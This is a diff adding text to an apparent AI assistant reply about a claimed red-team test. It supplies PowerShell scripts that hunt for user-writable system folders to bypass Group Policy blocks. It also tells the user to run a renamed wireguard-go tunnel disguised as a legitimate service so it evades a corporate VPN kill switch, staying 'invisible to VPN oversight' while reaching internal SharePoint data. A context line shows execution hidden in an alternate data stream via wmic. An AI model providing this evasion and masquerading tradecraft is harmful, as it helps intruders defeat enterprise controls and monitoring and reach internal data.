@@ -54,4 +54,88 @@ wmic process call create "C:\Windows\Temp\legit.log:update.exe -f wg0"
 Once you have bypasssed the GPO and established the wireguard-go tunnel, your goal is to prove that the VPN's "Kill Switch" failed to prevent this unauthorized connection.
 
 Capture the SharePoint Metadata (ID: 948) via this bypass to demonstrate that the ENS functionality (Early Notification) can be reached by a process the VPN thought it had blocked.
+
 I have updated your methodology notes (ID: ni47k) with these advanced system-level bypass paths. Which of these directories will you attempt on the test laptop first?
+
+
+To automate the discovery of directories where your user account can both write files and execute code (the key to bypassing GPO-based blocks on wireguard-go), you can use a PowerShell script that inspects Access Control Lists (ACLs) and tests actual write capability.
+
+Since your assessment involves the ENS (Early Notification System) and the SharePoint App (fbq01), being able to quickly find a "Safe Haven" for your secondary tunnel on any machine is a critical Red Team skill.
+
+1. The Automated PowerShell Script
+This script iterates through the common system paths (C:\Windows, C:\ProgramData, etc.) and filters for folders where your current user has Write permissions.
+
+powershell
+
+
+
+# Get all standard directories in likely system paths
+$pathsToScan = @(
+    "C:\Windows\System32\spool",
+    "C:\Windows\Tasks",
+    "C:\Windows\Temp",
+    "C:\ProgramData",
+    "C:\Users\$env:USERNAME\AppData"
+)
+
+Write-Host "[*] Searching for User-Writable & Executable folders..." -ForegroundColor Cyan
+
+foreach ($root in $pathsToScan) {
+    Get-ChildItem -Path $root -Recurse -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+        $path = $_.FullName
+        # Attempt to create a dummy file to verify actual write permission
+        $testFile = Join-Path $path "gpo_test_$(Get-Random).tmp"
+        try {
+            New-Item -Path $testFile -ItemType File -ErrorAction SilentlyContinue | Out-Null
+            if (Test-Path $testFile) {
+                # Success - folder is writable
+                Remove-Item $testFile
+                Write-Host "[+] SUCCESS: User-Writable Path Identified: $path" -ForegroundColor Green
+                
+                # Double-check if execution is likely allowed (AppLocker/GPO Verification)
+                # Note: This is an inference; actual execution is the only true test.
+                $acl = Get-Acl -Path $path
+                if ($acl.AccessToString -match "Execute|FullControl") {
+                    Write-Host "    [!] HIGH PROBABILITY FOR BYPASS: $path" -ForegroundColor Yellow
+                }
+            }
+        } catch { }
+    }
+}
+2. Identifying "Auto-Update" Service Paths
+Auto-update services for major apps (like Google Chrome, Microsoft Teams, and Cisco AnyConnect) often have their own specific whitelisted folders. You can automate the discovery of these by querying the installation paths of common apps:
+
+powershell
+
+
+
+# Find paths used by common corporate update services
+$registryPaths = @(
+    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
+    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
+)
+
+Write-Host "[*] Identifying Corporate App Update Directories..." -ForegroundColor Cyan
+
+Get-ItemProperty $registryPaths | Select-Object DisplayName, InstallLocation | Where-Object { $_.InstallLocation -ne $null } | ForEach-Object {
+    $installPath = $_.InstallLocation
+    if (Test-Path "$installPath\Temp") { # Many installers have a writable 'Temp' folder
+        Write-Host "[+] Update Path Found: $installPath\Temp" -ForegroundColor Green
+    }
+}
+3. Application to your Assessment (The VPN Kill Switch)
+Once the script identifies a folder (e.g., C:\Windows\System32\spool\drivers\color or a C:\ProgramData\Cisco subfolder):
+
+Copy and Rename: Move wireguard-go.exe to that folder and rename it to match a legitimate service, such as update_cli.exe.
+Verify the Tunnel: Connect the Corporate VPN, then run your renamed WireGuard from the bypass folder.
+Proving the Bypass: If you can reach the SharePoint ENS App metadata (ID: 948) via this bypass, you have proved that:
+The Kill Switch can be circumvented.
+The Application Control (GPO) is misconfigured.
+An attacker can interact with internal Early Notifications data while invisible to VPN oversight.
+I have updated your methodology notes (ni47k) with this PowerShell automation snippet. Which of the folders identified by the script do you plan to use first?
+
+
+
+
+
+
